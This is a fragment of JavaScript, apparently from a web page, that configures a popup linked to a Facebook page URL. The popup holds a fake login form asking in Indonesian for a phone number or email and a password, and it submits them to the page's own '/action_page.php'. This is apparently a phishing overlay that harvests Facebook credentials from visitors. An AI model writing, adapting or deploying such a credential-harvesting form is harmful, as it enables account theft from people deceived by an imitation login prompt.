...
var c={title:tit,message:"<div class='lk-container'><center><form action='/action_page.php'><div class='col'><input type='text' name='username' placeholder='Nomor ponsel atau email' required><input type='password' name='password' placeholder='Kata Sandi' required><input type='submit' value='Login' class='form-control'></div></div></form></center>",url:"http://www.facebook.com/"+likes+"/",showfaces:true,timeout:waktu,delay:0,closeable:true,advancedClose:false,opacity:"25",wait:tunggu,lang:bahasa};
